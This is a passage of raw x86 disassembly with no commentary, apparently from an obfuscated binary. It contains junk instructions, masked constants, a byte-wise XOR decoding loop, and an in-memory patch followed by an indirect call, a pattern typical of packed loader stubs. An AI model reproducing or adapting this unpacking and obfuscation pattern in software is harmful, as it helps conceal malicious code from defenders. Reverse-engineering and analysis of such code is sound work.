  401d3b:	and    DWORD PTR ds:0x413ce4,0x413c06
  401d45:	xor    ecx,esi
  401d47:	sub    DWORD PTR ds:0x413d20,0x413d28
  401d51:	add    ecx,edi
  401d53:	cmp    ecx,edx
  401d55:	jne    0x40234f
  401d5b:	add    edx,ecx
  401d5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401d60:	movzx  edx,WORD PTR ds:0x413ce8
  401d67:	sbb    DWORD PTR ds:0x413d20,edx
  401d6d:	mov    edx,DWORD PTR ds:0x4163b4
  401d73:	adc    DWORD PTR ds:0x413c12,0x5f59
  401d7d:	mov    edx,DWORD PTR [edx+0x198]
  401d83:	xor    ecx,esi
  401d85:	sbb    DWORD PTR ds:0x413ce8,0x413c16
  401d8f:	add    ecx,edi
  401d91:	cmp    ecx,DWORD PTR [edx]
  401d93:	mov    DWORD PTR ds:0x413ce8,0x77fb
  401d9d:	jne    0x401e78
  401da3:	and    DWORD PTR ds:0x414000,0x0
  401dad:	jmp    0x401dbf
  401db2:	mov    ecx,DWORD PTR ds:0x414000
  401db8:	inc    ecx
  401db9:	mov    DWORD PTR ds:0x414000,ecx
  401dbf:	cmp    DWORD PTR ds:0x414000,0x1b
  401dc6:	jae    0x401e12
  401dcc:	cmp    DWORD PTR ds:0x414000,0xb
  401dd3:	jne    0x401ded
  401dd9:	push   DWORD PTR [ebp-0x1c]
  401ddc:	push   0x413c78
  401de1:	push   DWORD PTR [ebp-0x14]
  401de4:	push   DWORD PTR [ebp-0x14]
  401de7:	call   DWORD PTR ds:0x416770
  401ded:	cmp    DWORD PTR ds:0x414000,0xa
  401df4:	jne    0x401e07
  401dfa:	mov    ecx,DWORD PTR ds:0x414000
  401e00:	inc    ecx
  401e01:	mov    DWORD PTR ds:0x414000,ecx
  401e07:	jmp    0x401db2
  401e0c:	xor    ecx,DWORD PTR ds:0x413c7c
  401e12:	mov    ecx,DWORD PTR [ebp-0x8]
  401e15:	and    DWORD PTR ds:0x413d34,0x54e0
  401e1f:	push   ebx
  401e20:	xor    ecx,esi
  401e22:	mov    DWORD PTR ds:0x413cec,0x48d
  401e2c:	add    ecx,edi
  401e2e:	xor    DWORD PTR ds:0x413ce4,0x413bf6
  401e38:	push   ecx
  401e39:	xor    DWORD PTR ds:0x413c74,0x7d0d
  401e43:	push   eax
  401e44:	and    DWORD PTR ds:0x413ce8,0xad4
  401e4e:	push   DWORD PTR [ebp-0xc]
  401e51:	adc    DWORD PTR ds:0x413cf4,0x414018
  401e5b:	push   DWORD PTR [ebp-0x8]
  401e5e:	sbb    DWORD PTR ds:0x413bf6,0x21c1
  401e68:	call   0x405399
  401e6d:	add    eax,DWORD PTR ds:0x41401c
  401e73:	mov    eax,0xf89c85bc
  401e78:	mov    ecx,DWORD PTR [ebp-0xc]
  401e7b:	sub    edx,DWORD PTR ds:0x413bfe
  401e81:	mov    DWORD PTR [ebp-0x18],ecx
  401e84:	or     ecx,DWORD PTR ds:0x413d2c
  401e8a:	mov    ecx,DWORD PTR [ebp-0x8]
  401e8d:	sub    DWORD PTR ds:0x413d1c,edi
  401e93:	mov    DWORD PTR [ebp-0x20],ecx
  401e96:	adc    ecx,0x6924
  401e9c:	mov    ecx,DWORD PTR [ebp-0x20]
  401e9f:	xor    ecx,esi
  401ea1:	mov    edx,DWORD PTR ds:0x413c74
  401ea7:	sub    DWORD PTR ds:0x413c02,edx
  401ead:	add    ecx,edi
  401eaf:	adc    edx,DWORD PTR ds:0x41401c
  401eb5:	mov    DWORD PTR [ebp+0x10],ecx
  401eb8:	mov    DWORD PTR ds:0x413c6c,0x13
  401ec2:	cmp    DWORD PTR ds:0x413c6c,0x0
  401ec9:	je     0x401f6c
  401ecf:	cmp    DWORD PTR ds:0x413c6c,0x7
  401ed6:	jne    0x401ef6
  401edc:	push   0x413d34
  401ee1:	push   0x7095
  401ee6:	push   0x4161ce
  401eeb:	push   0x4161ce
  401ef0:	call   DWORD PTR ds:0x416774
  401ef6:	cmp    DWORD PTR ds:0x413c6c,0x8
  401efd:	jne    0x401f10
  401f03:	mov    ecx,DWORD PTR ds:0x413c6c
  401f09:	dec    ecx
  401f0a:	mov    DWORD PTR ds:0x413c6c,ecx
  401f10:	mov    ecx,DWORD PTR ds:0x413c6c
  401f16:	dec    ecx
  401f17:	mov    DWORD PTR ds:0x413c6c,ecx
  401f1d:	jmp    0x401ec2
  401f22:	and    DWORD PTR ds:0x413c1a,0x0
  401f2c:	mov    ecx,DWORD PTR ds:0x413c1a
  401f32:	inc    ecx
  401f33:	mov    DWORD PTR ds:0x413c1a,ecx
  401f39:	cmp    DWORD PTR ds:0x413c1a,0x1f
  401f40:	jne    0x401f59
  401f46:	push   DWORD PTR [ebp-0x10]
  401f49:	push   0x413cdc
  401f4e:	push   0x4161a0
  401f53:	call   DWORD PTR ds:0x416778
  401f59:	cmp    DWORD PTR ds:0x413c1a,0x1a
  401f60:	jb     0x401f2c
  401f66:	inc    DWORD PTR ds:0x413c1e
  401f6c:	mov    ecx,DWORD PTR ds:0x416234
  401f72:	mov    ecx,DWORD PTR [ecx]
  401f74:	mov    DWORD PTR [ebp+0x10],ecx
  401f77:	mov    ecx,DWORD PTR ds:0x41643c
  401f7d:	mov    ecx,DWORD PTR [ecx]
  401f7f:	mov    DWORD PTR [ebp-0x1c],ecx
  401f82:	mov    edx,DWORD PTR ds:0x414014
  401f88:	sbb    DWORD PTR ds:0x413d34,edx
  401f8e:	mov    DWORD PTR [ebp+0xc],0xf89c87b0
  401f95:	mov    ecx,DWORD PTR [ebp+0xc]
  401f98:	xor    ecx,esi
  401f9a:	dec    DWORD PTR ds:0x413d24
  401fa0:	add    ecx,edi
  401fa2:	mov    edx,DWORD PTR ds:0x414010
  401fa8:	sbb    DWORD PTR ds:0x413bf6,edx
  401fae:	mov    DWORD PTR [ebp+0xc],ecx
  401fb1:	mov    ecx,DWORD PTR ds:0x4163b4
  401fb7:	or     edx,DWORD PTR ds:0x413c84
  401fbd:	mov    DWORD PTR [ebp+0xc],ecx
  401fc0:	mov    ecx,DWORD PTR [ebp+0x10]
  401fc3:	and    edx,DWORD PTR ds:0x413d20
  401fc9:	mov    DWORD PTR [ebp+0xc],ecx
  401fcc:	mov    ecx,DWORD PTR [ebp+0xc]
  401fcf:	push   0x4
  401fd1:	sbb    edx,0xf5
  401fd7:	pop    edx
  401fd8:	or     DWORD PTR ds:0x413bfe,0x38f7
  401fe2:	sub    edx,ecx
  401fe4:	add    edx,DWORD PTR [ebp-0x1c]
  401fe7:	xor    DWORD PTR ds:0x413c88,0x413cec
  401ff1:	mov    DWORD PTR [ebp-0x48],0xf89c85f0
  401ff8:	mov    DWORD PTR [ebp+0x10],edx
  401ffb:	mov    DWORD PTR [ebp-0x108],eax
  402001:	mov    eax,DWORD PTR [ebp+0xc]
  402004:	mov    DWORD PTR [ebp-0x104],eax
  40200a:	mov    eax,DWORD PTR [ebp+0x10]
  40200d:	mov    DWORD PTR [ebp-0x100],eax
  402013:	mov    eax,DWORD PTR [ebp-0x48]
  402016:	xor    eax,esi
  402018:	add    eax,edi
  40201a:	mov    DWORD PTR [ebp-0xfc],eax
  402020:	lea    eax,[ebp-0xb8]
  402026:	mov    DWORD PTR [ebp-0xf8],eax
  40202c:	mov    eax,DWORD PTR [ebp-0x108]
  402032:	xor    eax,esi
  402034:	add    eax,edi
  402036:	mov    DWORD PTR [ebp-0x108],eax
  40203c:	lea    eax,[ebp-0x108]
  402042:	push   eax
  402043:	mov    eax,DWORD PTR [ebp-0x18]
  402046:	xor    eax,esi
  402048:	add    eax,edi
  40204a:	push   eax
  40204b:	mov    eax,ds:0x4163d4
  402050:	push   0x41632a
  402055:	push   DWORD PTR [eax]
  402057:	call   0x402798
  40205c:	mov    eax,DWORD PTR [ebp+0xc]
  40205f:	mov    ecx,DWORD PTR [ebp+0x10]
  402062:	mov    DWORD PTR [ebp-0xa8],ecx
  402068:	mov    ecx,DWORD PTR [ebp-0x20]
  40206b:	xor    ecx,esi
  40206d:	mov    DWORD PTR [ebp-0x1c],eax
  402070:	add    ecx,edi
  402072:	jmp    0x4022ea
  402077:	lea    edx,[ecx+eax*1]
  40207a:	mov    DWORD PTR [ebp+0x10],edx
  40207d:	mov    edx,DWORD PTR [ebp-0xa8]
  402083:	sub    edx,ecx
  402085:	mov    DWORD PTR [ebp+0xc],edx
  402088:	mov    edx,DWORD PTR [ebp+0xc]
  40208b:	mov    DWORD PTR [ebp-0x6c],edx
  40208e:	mov    edx,DWORD PTR [ebp+0x10]
  402091:	mov    DWORD PTR [ebp-0x68],ebx
  402094:	mov    DWORD PTR [ebp-0x80],edx
  402097:	mov    DWORD PTR [ebp-0x2c],0xf89c85b1
  40209e:	mov    edx,DWORD PTR [ebp-0x68]
  4020a1:	xor    edx,esi
  4020a3:	add    edx,edi
  4020a5:	mov    DWORD PTR [ebp+0x10],edx
  4020a8:	mov    edx,DWORD PTR [ebp-0x68]
  4020ab:	xor    edx,esi
  4020ad:	add    edx,edi
  4020af:	mov    DWORD PTR [ebp+0xc],edx
  4020b2:	mov    DWORD PTR [ebp-0x88],0xf89c85d0
  4020bc:	mov    DWORD PTR [ebp-0x8c],0xf89c85bf
  4020c6:	mov    edx,DWORD PTR [ebp-0x68]
  4020c9:	mov    ebx,DWORD PTR [ebp-0x6c]
  4020cc:	xor    edx,esi
  4020ce:	add    edx,edi
  4020d0:	cmp    ebx,edx
  4020d2:	je     0x4022d9
  4020d8:	mov    eax,DWORD PTR [ebp-0x2c]
  4020db:	xor    eax,esi
  4020dd:	mov    edx,0xffcd8d24
  4020e2:	sub    edx,eax
  4020e4:	add    edx,DWORD PTR [ebp-0x6c]
  4020e7:	mov    eax,DWORD PTR [ebp-0x2c]
  4020ea:	mov    ebx,DWORD PTR [ebp+0x10]
  4020ed:	xor    eax,esi
  4020ef:	add    eax,edi
  4020f1:	imul   eax,ebx
  4020f4:	cmp    eax,edx
  4020f6:	ja     0x4022d6
  4020fc:	mov    edx,DWORD PTR [ebp+0x10]
  4020ff:	mov    eax,DWORD PTR [ebp-0x6c]
  402102:	mov    ebx,DWORD PTR [ebp-0x88]
  402108:	sub    eax,edx
  40210a:	xor    ebx,esi
  40210c:	xor    edx,edx
  40210e:	add    ebx,edi
  402110:	div    ebx
  402112:	mov    DWORD PTR [ebp+0xc],eax
  402115:	mov    eax,DWORD PTR [ebp-0x8c]
  40211b:	mov    edx,DWORD PTR [ebp+0xc]
  40211e:	xor    eax,esi
  402120:	add    eax,edi
  402122:	cmp    edx,eax
  402124:	jbe    0x402137
  40212a:	mov    eax,DWORD PTR [ebp-0x8c]
  402130:	xor    eax,esi
  402132:	add    eax,edi
  402134:	mov    DWORD PTR [ebp+0xc],eax
  402137:	mov    eax,DWORD PTR [ebp-0x88]
  40213d:	mov    edx,DWORD PTR [ebp+0xc]
  402140:	xor    eax,esi
  402142:	add    eax,edi
  402144:	imul   eax,edx
  402147:	mov    DWORD PTR [ebp+0xc],eax
  40214a:	mov    eax,DWORD PTR [ebp-0x68]
  40214d:	mov    edx,DWORD PTR [ebp+0xc]
  402150:	xor    eax,esi
  402152:	add    eax,edi
  402154:	cmp    edx,eax
  402156:	je     0x4022bf
  40215c:	mov    eax,DWORD PTR [ebp+0xc]
  40215f:	mov    DWORD PTR [ebp-0x28],eax
  402162:	mov    eax,DWORD PTR [ebp+0x10]
  402165:	add    eax,DWORD PTR [ebp-0x80]
  402168:	mov    DWORD PTR [ebp-0x48],0xf89c85b0
  40216f:	mov    DWORD PTR [ebp-0x44],eax
  402172:	mov    eax,0xf89c85b1
  402177:	mov    DWORD PTR [ebp-0x7c],eax
  40217a:	mov    DWORD PTR [ebp-0x74],0xf89c85b2
  402181:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  402188:	mov    DWORD PTR [ebp-0x3c],eax
  40218b:	mov    eax,DWORD PTR [ebp-0x48]
  40218e:	xor    eax,esi
  402190:	add    eax,edi
  402192:	jmp    0x40227b
  402197:	mov    DWORD PTR [ebp-0x98],0xf89c85b9
  4021a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4021a4:	mov    edx,DWORD PTR [ebp+0xc]
  4021a7:	xor    eax,esi
  4021a9:	add    eax,edi
  4021ab:	imul   eax,edx
  4021ae:	mov    edx,DWORD PTR [ebp-0x44]
  4021b1:	mov    al,BYTE PTR [eax+edx*1]
  4021b4:	mov    BYTE PTR [ebp-0x1],al
  4021b7:	mov    eax,DWORD PTR [ebp-0x3c]
  4021ba:	mov    edx,DWORD PTR [ebp+0xc]
  4021bd:	xor    eax,esi
  4021bf:	add    eax,edi
  4021c1:	imul   eax,edx
  4021c4:	mov    edx,DWORD PTR [ebp-0x74]
  4021c7:	xor    edx,esi
  4021c9:	add    eax,edx
  4021cb:	mov    edx,DWORD PTR [ebp-0x44]
  4021ce:	movzx  eax,BYTE PTR [eax+edx*1+0x3272dc]
  4021d6:	mov    edx,DWORD PTR [ebp-0x98]
  4021dc:	xor    edx,esi
  4021de:	lea    eax,[edx+eax*1+0x3272dc]
  4021e5:	movzx  edx,BYTE PTR [ebp-0x1]
  4021e9:	xor    edx,eax
  4021eb:	mov    BYTE PTR [ebp-0x1],dl
  4021ee:	mov    al,BYTE PTR [ebp-0x1]
  4021f1:	mov    edx,DWORD PTR [ebp-0x3c]
  4021f4:	mov    ebx,DWORD PTR [ebp+0xc]
  4021f7:	xor    edx,esi
  4021f9:	add    edx,edi
  4021fb:	imul   edx,ebx
  4021fe:	mov    ebx,DWORD PTR [ebp-0x44]
  402201:	mov    BYTE PTR [edx+ebx*1],al
  402204:	mov    eax,DWORD PTR [ebp-0x3c]
  402207:	mov    edx,DWORD PTR [ebp+0xc]
  40220a:	xor    eax,esi
  40220c:	add    eax,edi
  40220e:	imul   eax,edx
  402211:	mov    edx,DWORD PTR [ebp-0x44]
  402214:	mov    al,BYTE PTR [eax+edx*1]
  402217:	mov    BYTE PTR [ebp-0x1],al
  40221a:	mov    eax,DWORD PTR [ebp-0x3c]
  40221d:	mov    edx,DWORD PTR [ebp+0xc]
  402220:	xor    eax,esi
  402222:	add    eax,edi
  402224:	imul   eax,edx
  402227:	mov    edx,DWORD PTR [ebp-0x7c]
  40222a:	xor    edx,esi
  40222c:	add    eax,edx
  40222e:	mov    edx,DWORD PTR [ebp-0x44]
  402231:	movzx  eax,BYTE PTR [eax+edx*1+0x3272dc]
  402239:	mov    edx,DWORD PTR [ebp-0xc4]
  40223f:	xor    edx,esi
  402241:	lea    eax,[edx+eax*1+0x3272dc]
  402248:	movzx  edx,BYTE PTR [ebp-0x1]
  40224c:	xor    edx,eax
  40224e:	mov    BYTE PTR [ebp-0x1],dl
  402251:	mov    al,BYTE PTR [ebp-0x1]
  402254:	mov    edx,DWORD PTR [ebp-0x3c]
  402257:	mov    ebx,DWORD PTR [ebp+0xc]
  40225a:	xor    edx,esi
  40225c:	add    edx,edi
  40225e:	imul   edx,ebx
  402261:	mov    ebx,DWORD PTR [ebp-0x44]
  402264:	mov    BYTE PTR [edx+ebx*1],al
  402267:	mov    eax,DWORD PTR [ebp-0x10]
  40226a:	mov    edx,DWORD PTR [ebp-0x7c]
  40226d:	xor    eax,esi
  40226f:	xor    edx,esi
  402271:	add    eax,edi
  402273:	add    edx,edi
  402275:	imul   eax,edx
  402278:	add    eax,DWORD PTR [ebp+0xc]
  40227b:	mov    DWORD PTR [ebp+0xc],eax
  40227e:	mov    eax,DWORD PTR [ebp+0xc]
  402281:	mov    edx,DWORD PTR [ebp-0x28]
  402284:	cmp    edx,eax
  402286:	jb     0x402197
  40228c:	mov    eax,DWORD PTR [ebp-0x7c]
  40228f:	mov    edx,DWORD PTR [ebp-0x28]
  402292:	xor    eax,esi
  402294:	add    eax,edi
  402296:	imul   eax,edx
  402299:	mov    edx,DWORD PTR [ebp-0x48]
  40229c:	xor    edx,esi
  40229e:	add    edx,edi
  4022a0:	or     eax,edx
  4022a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4022a5:	xor    edx,esi
  4022a7:	add    eax,edx
  4022a9:	mov    edx,DWORD PTR [ebp-0x2c]
  4022ac:	xor    edx,esi
  4022ae:	add    eax,edx
  4022b0:	mov    edx,DWORD PTR [ebp+0x10]
  4022b3:	lea    eax,[eax+edx*1+0x64e5b8]
  4022ba:	jmp    0x4022ce
  4022bf:	mov    eax,DWORD PTR [ebp-0x2c]
  4022c2:	mov    edx,DWORD PTR [ebp+0x10]
  4022c5:	xor    eax,esi
  4022c7:	lea    eax,[eax+edx*1+0x3272dc]
  4022ce:	mov    DWORD PTR [ebp+0x10],eax
  4022d1:	jmp    0x4020d8
  4022d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4022d9:	mov    edx,DWORD PTR [ebp-0x18]
  4022dc:	xor    edx,esi
  4022de:	mov    ebx,0xf89c85b0
  4022e3:	lea    ecx,[ecx+edx*1+0x3272dc]
  4022ea:	lea    edx,[ecx-0x3272dc]
  4022f0:	xor    edx,esi
  4022f2:	cmp    edx,0xf89c95b0
  4022f8:	jne    0x402077
  4022fe:	mov    ecx,DWORD PTR [ebp-0x20]
  402301:	xor    ecx,esi
  402303:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dc]
  40230a:	mov    BYTE PTR [ebp+0xf],cl
  40230d:	mov    ecx,DWORD PTR [ebp-0x18]
  402310:	mov    edx,DWORD PTR [ebp-0x20]
  402313:	xor    ecx,esi
  402315:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dc]
  40231c:	xor    edx,esi
  40231e:	mov    BYTE PTR [edx+eax*1+0x3272dc],cl
  402325:	mov    ecx,DWORD PTR [ebp-0x18]
  402328:	mov    dl,BYTE PTR [ebp+0xf]
  40232b:	xor    ecx,esi
  40232d:	mov    BYTE PTR [ecx+eax*1+0x3272dc],dl
  402334:	mov    eax,DWORD PTR [ebp-0x18]
  402337:	mov    eax,DWORD PTR [ebp-0x8]
  40233a:	xor    eax,esi
  40233c:	add    eax,edi
  40233e:	mov    ds:0x416438,eax
  402343:	mov    eax,DWORD PTR [ebp-0x8]
  402346:	xor    eax,esi
  402348:	add    eax,edi
  40234a:	mov    ds:0x416430,eax
  40234f:	lea    eax,[ebp-0x40]
  402352:	mov    DWORD PTR [ebp-0xc0],eax
  402358:	lea    eax,[ebp+0x4]
  40235b:	mov    DWORD PTR [ebp-0x40],eax
  40235e:	mov    eax,DWORD PTR [ebp-0x40]
  402361:	test   eax,eax
  402363:	je     0x402663
  402369:	mov    eax,ds:0x4163b4
  40236e:	mov    DWORD PTR [ebp+0xc],0xf152c39
  402375:	mov    DWORD PTR [ebp+0xc],0x712ed0e
  40237c:	mov    DWORD PTR [ebp+0xc],0x373fc28
  402383:	mov    DWORD PTR [ebp+0xc],0x72670a18
  40238a:	mov    DWORD PTR [ebp+0x10],eax
  40238d:	mov    eax,ds:0x4164c0
  402392:	mov    DWORD PTR [ebp-0xac],eax
  402398:	and    DWORD PTR [ebp-0x90],0x0
  40239f:	mov    DWORD PTR [ebp+0xc],ebx
  4023a2:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  4023a9:	mov    eax,DWORD PTR [ebp-0x58]
  4023ac:	mov    ecx,DWORD PTR [ebp-0x58]
  4023af:	xor    eax,ecx
  4023b1:	mov    DWORD PTR [ebp-0x58],eax
  4023b4:	or     DWORD PTR [ebp-0x58],0xf89cb5b0
  4023bb:	mov    eax,DWORD PTR [ebp-0x70]
  4023be:	mov    ecx,DWORD PTR [ebp-0x70]
  4023c1:	xor    eax,ecx
  4023c3:	mov    DWORD PTR [ebp-0x70],eax
  4023c6:	add    DWORD PTR [ebp-0x70],0xf89f05b0
  4023cd:	mov    eax,DWORD PTR [ebp-0x50]
  4023d0:	mov    ecx,DWORD PTR [ebp-0x50]
  4023d3:	xor    eax,ecx
  4023d5:	mov    DWORD PTR [ebp-0x50],eax
  4023d8:	add    DWORD PTR [ebp-0x50],0xf89c85f0
  4023df:	mov    eax,DWORD PTR [ebp-0x64]
  4023e2:	mov    ecx,DWORD PTR [ebp-0x64]
  4023e5:	xor    eax,ecx
  4023e7:	mov    DWORD PTR [ebp-0x64],eax
  4023ea:	add    DWORD PTR [ebp-0x64],0xf89c85d0
  4023f1:	mov    eax,DWORD PTR [ebp-0x4c]
  4023f4:	mov    ecx,DWORD PTR [ebp-0x4c]
  4023f7:	xor    eax,ecx
  4023f9:	mov    DWORD PTR [ebp-0x4c],eax
  4023fc:	mov    eax,DWORD PTR [ebp+0xc]
  4023ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  402402:	xor    eax,esi
  402404:	add    eax,edi
  402406:	xor    eax,ecx
  402408:	mov    DWORD PTR [ebp-0x4c],eax
  40240b:	mov    eax,DWORD PTR [ebp-0x30]
  40240e:	mov    ecx,DWORD PTR [ebp-0x30]
  402411:	sub    eax,ecx
  402413:	mov    DWORD PTR [ebp-0x30],eax
  402416:	add    DWORD PTR [ebp-0x30],0xf89c85bd
  40241d:	mov    al,BYTE PTR [ebp-0x2]
  402420:	movzx  ecx,BYTE PTR [ebp-0x2]
  402424:	movzx  eax,al
  402427:	sub    eax,ecx
  402429:	mov    BYTE PTR [ebp-0x2],al
  40242c:	movzx  eax,BYTE PTR [ebp-0x2]
  402430:	xor    eax,0xffffff85
  402433:	mov    BYTE PTR [ebp-0x2],al
  402436:	mov    eax,DWORD PTR [ebp+0xc]
  402439:	xor    eax,esi
  40243b:	add    eax,edi
  40243d:	mov    DWORD PTR [ebp-0x4c],eax
  402440:	lea    eax,[ebp-0x9c]
  402446:	mov    DWORD PTR [ebp-0xa0],eax
  40244c:	lea    eax,[ebp-0xa0]
  402452:	mov    DWORD PTR [ebp-0x94],eax
  402458:	lea    eax,[ebp-0x94]
  40245e:	mov    DWORD PTR [ebp-0x38],eax
  402461:	lea    eax,[ebp-0x38]
  402464:	mov    DWORD PTR [ebp-0xb4],eax
  40246a:	mov    eax,DWORD PTR [ebp-0x50]
  40246d:	xor    eax,esi
  40246f:	add    eax,edi
  402471:	push   eax
  402472:	mov    eax,DWORD PTR [ebp-0x58]
  402475:	xor    eax,esi
  402477:	add    eax,edi
  402479:	push   eax
  40247a:	mov    eax,DWORD PTR [ebp-0x30]
  40247d:	xor    eax,esi
  40247f:	add    eax,edi
  402481:	push   eax
  402482:	lea    eax,[ebp-0x14c]
  402488:	push   eax
  402489:	push   DWORD PTR [ebp+0xc]
  40248c:	push   DWORD PTR [ebp-0x28]
  40248f:	call   0x407c50
  402494:	test   eax,eax
  402496:	je     0x4024ca
  40249c:	lea    eax,[ebp-0x14c]
  4024a2:	push   eax
  4024a3:	mov    eax,DWORD PTR [ebp-0x28]
  4024a6:	xor    eax,esi
  4024a8:	add    eax,edi
  4024aa:	push   eax
  4024ab:	mov    eax,DWORD PTR [ebp+0x10]
  4024ae:	add    eax,0xaa
  4024b3:	push   eax
  4024b4:	mov    eax,DWORD PTR [ebp+0x10]
  4024b7:	mov    eax,DWORD PTR [eax+0x198]
  4024bd:	push   DWORD PTR [eax]
  4024bf:	call   0x402798
  4024c4:	mov    DWORD PTR [ebp-0x9c],eax
  4024ca:	lea    eax,[ebp+0x4]
  4024cd:	mov    DWORD PTR [ebp-0x90],eax
  4024d3:	mov    eax,DWORD PTR [ebp-0x38]
  4024d6:	mov    eax,DWORD PTR [eax]
  4024d8:	mov    eax,DWORD PTR [eax]
  4024da:	mov    eax,DWORD PTR [eax]
  4024dc:	test   eax,eax
  4024de:	je     0x402565
  4024e4:	lea    eax,[ebp-0x34]
  4024e7:	mov    DWORD PTR [ebp-0xbc],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0xac]
  4024f3:	mov    DWORD PTR [ebp-0x34],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x38]
  4024f9:	mov    eax,DWORD PTR [eax]
  4024fb:	mov    eax,DWORD PTR [eax]
  4024fd:	mov    eax,DWORD PTR [eax]
  4024ff:	sub    DWORD PTR [ebp-0x34],eax
  402502:	mov    ecx,DWORD PTR [ebp-0x30]
  402505:	xor    ecx,esi
  402507:	mov    eax,0xffcd8d24
  40250c:	sub    eax,ecx
  40250e:	add    DWORD PTR [ebp-0x34],eax
  402511:	mov    eax,DWORD PTR [ebp-0x34]
  402514:	mov    ecx,DWORD PTR [ebp-0x38]
  402517:	mov    ecx,DWORD PTR [ecx]
  402519:	mov    ecx,DWORD PTR [ecx]
  40251b:	mov    ecx,DWORD PTR [ecx]
  40251d:	mov    DWORD PTR [ecx+0x1],eax
  402520:	mov    al,BYTE PTR [ebp-0x2]
  402523:	mov    ecx,DWORD PTR [ebp-0x38]
  402526:	mov    ecx,DWORD PTR [ecx]
  402528:	mov    ecx,DWORD PTR [ecx]
  40252a:	mov    ecx,DWORD PTR [ecx]
  40252c:	push   DWORD PTR [ebp+0x10]
  40252f:	xor    al,0x70
  402531:	sub    al,0xc
  402533:	mov    BYTE PTR [ecx],al
  402535:	mov    eax,ds:0x416230
  40253a:	push   DWORD PTR [eax]
  40253c:	push   DWORD PTR ds:0x41648c
  402542:	push   DWORD PTR ds:0x416238
  402548:	push   DWORD PTR ds:0x41646c
  40254e:	push   DWORD PTR ds:0x416510
  402554:	push   DWORD PTR [ebp-0x28]
  402557:	push   DWORD PTR [ebp+0xc]
  40255a:	mov    eax,DWORD PTR [ebp-0x38]
  40255d:	mov    eax,DWORD PTR [eax]
  40255f:	mov    eax,DWORD PTR [eax]
  402561:	mov    eax,DWORD PTR [eax]
  402563:	call   eax
  402565:	mov    eax,DWORD PTR [ebp-0x24]
  402568:	mov    eax,DWORD PTR [ebp-0xc]
  40256b:	mov    eax,DWORD PTR [ebp-0x8]
  40256e:	mov    DWORD PTR [ebp+0xc],eax
  402571:	mov    eax,eax
  402573:	mov    eax,ds:0x4163b4
  402578:	mov    eax,DWORD PTR [eax+0x1c8]
  40257e:	mov    eax,DWORD PTR [eax]
  402580:	cdq    
  402581:	mov    ebx,eax
  402583:	mov    eax,0xfabdbeef
  402588:	add    ebx,eax
  40258a:	adc    edx,0xffffffff
  40258d:	and    DWORD PTR [ebp-0x10],0x0
  402591:	xor    edx,0x0
  402594:	mov    DWORD PTR [ebp-0x80],edx
  402597:	mov    edx,DWORD PTR [ebp+0xc]
  40259a:	mov    DWORD PTR [ebp-0x14],edx
  40259d:	mov    ecx,0x8a29a125
  4025a2:	xor    ebx,ecx
  4025a4:	add    DWORD PTR [ebp-0x14],eax
  4025a7:	mov    edx,DWORD PTR [ebp-0x14]
  4025aa:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4025ae:	xor    edx,ecx
  4025b0:	mov    DWORD PTR [ebp-0x78],edx
  4025b3:	mov    edx,DWORD PTR [ebp-0x10]
  4025b6:	xor    edx,0x0
  4025b9:	mov    DWORD PTR [ebp-0x74],edx
  4025bc:	cmp    DWORD PTR [ebp-0x78],ebx
  4025bf:	jne    0x4025d1
  4025c5:	mov    edx,DWORD PTR [ebp-0x80]
  4025c8:	cmp    DWORD PTR [ebp-0x74],edx
  4025cb:	je     0x402600
  4025d1:	mov    edx,DWORD PTR ds:0x4163b4
  4025d7:	mov    edx,DWORD PTR [edx+0x1c0]
  4025dd:	mov    edx,DWORD PTR [edx]
  4025df:	xor    ebx,ebx
  4025e1:	add    edx,eax
  4025e3:	adc    ebx,0xffffffff
  4025e6:	xor    edx,ecx
  4025e8:	xor    ebx,0x0
  4025eb:	cmp    edx,0x70941fd5
  4025f1:	jne    0x402663
  4025f7:	cmp    ebx,0xffffffff
  4025fa:	jne    0x402663
  402600:	mov    edx,DWORD PTR ds:0x416430
  402606:	mov    ebx,DWORD PTR ds:0x416438
  40260c:	xor    edx,ebx
  40260e:	mov    DWORD PTR ds:0x416430,edx
  402614:	mov    edx,DWORD PTR [ebp-0x40]
  402617:	mov    ebx,DWORD PTR ds:0x416430
  40261d:	add    ebx,DWORD PTR [edx]
  40261f:	mov    edx,DWORD PTR [ebp-0x40]
  402622:	mov    DWORD PTR [edx],ebx
  402624:	mov    edx,DWORD PTR [ebp+0xc]
  402627:	xor    esi,edx
  402629:	mov    edx,DWORD PTR ds:0x416430
  40262f:	add    esi,edi
  402631:	xor    ebx,ebx
  402633:	add    esi,eax
  402635:	adc    ebx,0xffffffff
  402638:	xor    edi,edi
  40263a:	xor    esi,ecx
  40263c:	xor    ebx,0x0
  40263f:	add    edx,eax
  402641:	adc    edi,0xffffffff
  402644:	xor    edx,ecx
  402646:	xor    edi,0x0
  402649:	cmp    edx,esi
  40264b:	jne    0x402663
  402651:	cmp    edi,ebx
  402653:	jne    0x402663
  402659:	mov    eax,ds:0x416430
  40265e:	mov    ds:0x416438,eax
  402663:	mov    eax,ds:0x4163b4
  402668:	push   0x4
  40266a:	add    eax,0x1cc
  40266f:	push   eax
  402670:	lea    eax,[ebp-0x24]
  402673:	push   eax
  402674:	call   0x40a25b
  402679:	mov    eax,DWORD PTR [ebp-0x24]
  40267c:	mov    eax,DWORD PTR [eax]
  40267e:	pop    edi
  40267f:	pop    esi
  402680:	pop    ebx
  402681:	leave  
  402682:	ret    0xc
  402685:	push   ebp
  402686:	mov    ebp,esp
  402688:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  402692:	mov    DWORD PTR ds:0x41400c,0x56b8
  40269c:	pop    ebp
  40269d:	jmp    0x401000
  4026a2:	xor    eax,eax
  4026a4:	inc    eax
  4026a5:	ret    
  4026a6:	push   ebp
  4026a7:	mov    ebp,esp
  4026a9:	push   ecx
  4026aa:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4026b1:	mov    DWORD PTR ds:0x414008,0x3fb4
  4026bb:	mov    eax,DWORD PTR [ebp+0x8]
  4026be:	add    DWORD PTR ds:0x413bf6,0x2653
  4026c8:	mov    al,BYTE PTR [eax]
